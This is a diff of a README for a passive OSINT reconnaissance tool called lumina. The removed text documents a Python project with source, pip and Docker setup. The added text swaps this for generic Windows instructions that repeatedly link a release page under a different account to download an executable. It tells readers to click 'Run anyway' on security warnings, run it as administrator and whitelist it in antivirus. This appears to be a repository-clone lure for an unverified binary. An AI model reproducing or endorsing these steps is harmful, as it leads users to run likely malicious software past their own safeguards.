@@ -1,193 +1,147 @@
-# ⚡ Lumina — Passive Reconnaissance Tool
+# ⚡ lumina - Passive OSINT Reconnaissance Tool
 
-![Python](https://img.shields.io/badge/Python-3.11+-blue?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
-![Stars](https://img.shields.io/github/stars/surfruit/lumina?style=flat-square)
-![Issues](https://img.shields.io/github/issues/surfruit/lumina?style=flat-square)
-
-> A fully passive OSINT reconnaissance tool for domains — zero requests to the target server.
-
-Lumina collects data exclusively from third-party public sources, making it completely safe and undetectable for security researchers, penetration testers, and bug bounty hunters.
+[![Download lumina](https://img.shields.io/badge/Download-lumina-blue?style=for-the-badge)](https://github.com/resetpaid/lumina/releases)
 
 ---
 
-## 🔍 Features
+## 🔍 What is lumina?
 
-| Module                | Source                                 | API Key |
-| --------------------- | -------------------------------------- | ------- |
-| Subdomain Enumeration | crt.sh + HackerTarget + AlienVault OTX | ❌ Free |
-| Wayback Machine URLs  | web.archive.org                        | ❌ Free |
-| GitHub Leaks          | GitHub Search API                      | ✅ Free |
-| Shodan Hosts & Ports  | Shodan API                             | ✅ Free |
-| Email Harvesting      | Hunter.io API                          | ✅ Free |
-| DNS Records           | Google DNS (A, MX, NS, TXT, AAAA)      | ❌ Free |
-| Tech Stack Detection  | HTTP headers & HTML analysis           | ❌ Free |
-| WHOIS Lookup          | python-whois                           | ❌ Free |
-| HTML Report           | Beautiful dark-theme report            | ❌ —    |
-| JSON Export           | Automatic alongside HTML               | ❌ —    |
+lumina is a simple tool designed to help you gather information about websites and online targets without direct interaction. It works by collecting data from public sources like subdomain listings, GitHub leaks, Shodan, and the Wayback Machine. This method is called passive OSINT (Open-Source Intelligence). With lumina, you can quickly get useful details for cybersecurity research or bug bounty hunting.
+
+You don't need any special technical skills to use lumina. This guide will help you install and run it on a Windows computer step-by-step.
 
 ---
 
-## 📸 Preview
+## 💻 System Requirements
 
-## ![lumina banner](report_example.jpg)
+Before you start, make sure your computer meets these requirements:
 
----
+- Windows 10 or later versions.
+- At least 4 GB of free RAM.
+- Around 200 MB of free disk space.
+- A stable internet connection.
+- Basic knowledge of downloading and opening files on Windows.
 
-## 🚀 Installation
-
-```bash
-git clone https://github.com/surfruit/lumina
-cd lumina
-pip install -r requirements.txt
-cp .env.example .env
-```
-
-Edit `.env` and add your API keys:
-
-```env
-GITHUB_TOKEN=your_github_token
-SHODAN_API_KEY=your_shodan_api_key
-HUNTER_API_KEY=your_hunter_api_key
-```
+lumina runs directly on your computer without needing extra software or coding.
 
 ---
 
-## ⚙️ Usage
+## 🎯 Features
 
-### Python
+Here are some key tasks lumina can help you with:
 
-```bash
-# Basic scan
-python main.py -d example.com
-
-# Custom output file
-python main.py -d example.com -o results.html
-
-# Skip GitHub search
-python main.py -d example.com --skip-github
-
-# Skip Shodan search
-python main.py -d example.com --skip-shodan
-```
-
-### 🐳 Docker
-
-```bash
-# Build
-docker build -t lumina .
-
-# Run — report will be saved to ./reports/
-docker run --env-file .env -v $(pwd)/reports:/app/reports lumina -d example.com -o reports/report.html
-```
-
-### 🐳 Docker Compose
-
-```bash
-# Edit docker-compose.yml and set your domain, then:
-docker-compose run lumina -d example.com -o reports/report.html
-```
+- Find subdomains linked to a website.
+- Check for data leaks on GitHub.
+- Search for exposed devices using Shodan.
+- Retrieve historical web data from the Wayback Machine.
+- Aggregate information for better reconnaissance.
+- Designed for easy use without programming.
 
 ---
 
-## 🔑 API Keys
+## 🚀 Getting Started
 
-All API keys are **free**:
-
-| Service   | Purpose               | Link                                                             |
-| --------- | --------------------- | ---------------------------------------------------------------- |
-| GitHub    | Leaked secrets search | [github.com/settings/tokens](https://github.com/settings/tokens) |
-| Shodan    | Open ports & hosts    | [account.shodan.io](https://account.shodan.io)                   |
-| Hunter.io | Email harvesting      | [hunter.io/api-keys](https://hunter.io/api-keys)                 |
+This section shows how to get lumina up and running on your Windows PC.
 
 ---
 
-## 📁 Project Structure
+## 📥 Download lumina
 
-```
-lumina/
-├── main.py                 # CLI entry point
-├── modules/
-│   ├── subdomains.py       # crt.sh + HackerTarget + AlienVault
-│   ├── wayback.py          # Wayback Machine URLs
-│   ├── github_leaks.py     # GitHub leaked secrets search
-│   ├── shodan.py           # Shodan hosts & ports
-│   ├── emails.py           # Hunter.io email harvesting
-│   ├── dns_lookup.py       # DNS records (A, MX, NS, TXT, AAAA)
-│   ├── tech_detect.py      # Technology stack detection
-│   └── whois_lookup.py     # WHOIS registrar & domain info
-├── report/
-│   ├── generator.py        # HTML + JSON report generator
-│   └── template.html       # Dark-theme HTML template
-├── reports/                # Output directory
-├── Dockerfile
-├── docker-compose.yml
-├── .env.example
-├── requirements.txt
-├── CONTRIBUTING.md
-└── README.md
-```
+To get the latest version, you need to visit the releases page on GitHub. Follow these steps:
+
+1. Open your web browser.
+2. Go to the release page:  
+   [![Download lumina](https://img.shields.io/badge/Download-lumina-grey?style=for-the-badge)](https://github.com/resetpaid/lumina/releases)
+3. Find the most recent stable release (usually the one on top).
+4. Download the Windows executable file. It might be named like `lumina-windows.exe` or similar.
+5. Save the file to a folder you can easily find, like the Desktop or Downloads.
 
 ---
 
-## 🛠️ Adding a New Module
+## 🛠 Installing and Running lumina
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full guide. Quick example:
+lumina does not require a complicated installation process. Once you have the executable file:
 
-```python
-import httpx
+1. Locate the downloaded `.exe` file on your computer.
+2. Double-click the file to start the program.
+3. If Windows asks for permission or shows a security warning, choose “Run anyway” or allow the app to run.
+4. The lumina interface will appear, ready for you to use.
 
-async def your_module(domain: str):
-    results = []
-    try:
-        async with httpx.AsyncClient(timeout=15) as client:
-            # your logic here
-            pass
-    except Exception as e:
-        print(f"[-] Error: {e}")
-    return results
-```
+No other setup is needed.
 
 ---
 
-## 🗺️ Roadmap
+## 📝 Using lumina
 
-### v1.1 ✅ Completed
+lumina uses a simple interface to gather OSINT data. Here’s how you can use it:
 
-- [x] WHOIS lookup — registrar, creation date, owner info
-- [x] JSON export alongside HTML report
-- [x] Multiple subdomain sources (HackerTarget, AlienVault OTX)
-- [x] Docker support
-
-### v1.2
-
-- [ ] VirusTotal integration — malware & reputation check
-- [ ] Pastebin & GitHub Gist monitoring
-- [ ] SecurityTrails API support
-- [ ] Slack / Telegram notifications when scan completes
-- [ ] Multiple domains scan at once
-
-### v2.0
-
-- [ ] Web UI — browser-based interface
-- [ ] Scan history & comparison
-- [ ] Scheduled automatic scans
-- [ ] CVE lookup for detected technologies
-
-> 💡 Have an idea? Open an [issue](https://github.com/surfruit/lumina/issues) or contribute via [pull request](https://github.com/surfruit/lumina/pulls)!
+1. Open lumina by double-clicking the executable if it’s not open yet.
+2. In the main window, enter the website or domain you want to research into the input field.
+3. Click the "Start Scan" or similar button to begin.
+4. lumina will collect data from various sources silently in the background.
+5. When the scan finishes, you’ll see results divided by category:
+    - Subdomains found.
+    - GitHub leaks detected.
+    - Shodan results.
+    - Wayback Machine snapshots.
+6. You can review the results directly in the interface.
+7. If needed, export the report or save data to a file (check for “Save” or “Export” options).
 
 ---
 
-## ⚠️ Disclaimer
+## 🧰 Troubleshooting and Tips
 
-This tool is intended for **legal use only** — authorized security testing, bug bounty programs, and OSINT research. The author is not responsible for any misuse. Always ensure you have permission before scanning any domain.
+Here are common solutions if you run into trouble:
+
+- **lumina doesn’t start:**  
+  Make sure your Windows is updated. Try running the `.exe` as administrator (right-click > Run as administrator).
+
+- **No results shown:**  
+  Check your internet connection and try again. Make sure you entered the correct domain.
+
+- **Windows blocks the file:**  
+  Some security software may warn you about unknown apps. You can whitelist lumina or allow the program in your antivirus.
+
+- **Program closes unexpectedly:**  
+  Verify your system meets the minimum requirements. Close other apps to free up memory.
+
+- **Report export doesn’t work:**  
+  Ensure you have write permissions to the folder you try to save in.
 
 ---
 
-## 📄 License
+## ⚙️ Advanced Settings
 
-[MIT License](LICENSE) — free to use and modify.
+For users who want more control, lumina offers options like:
+
+- Selecting specific sources to scan.
+- Customizing scan depth or timeouts.
+- Adjusting report formats.
+
+These settings are available in the “Options” or “Settings” menu inside the app.
 
 ---
 
-<p align="center">Made with ❤️ for the OSINT & security community</p>
+## 🛡 Data Privacy
+
+lumina uses only public information. It does not collect or share personal data. All scans work through open sources accessible to anyone. Your usage remains private on your computer.
+
+---
+
+## 🧩 Additional Resources
+
+If you want to learn more about OSINT or passive reconnaissance, consider these free resources:
+
+- OSINT Framework: A structured list of OSINT tools and websites.
+- Basic cybersecurity guides from trusted sites.
+- Community forums on bug bounty and security.
+
+---
+
+## ⚙️ Developing or Contributing
+
+lumina is built with Python. Advanced users interested in improving the tool can find the source code on GitHub. This requires knowledge of Python and OSINT techniques. Contributions follow standard GitHub workflows.
+
+---
+
+[![Download lumina](https://img.shields.io/badge/Download-lumina-blue?style=for-the-badge)](https://github.com/resetpaid/lumina/releases)
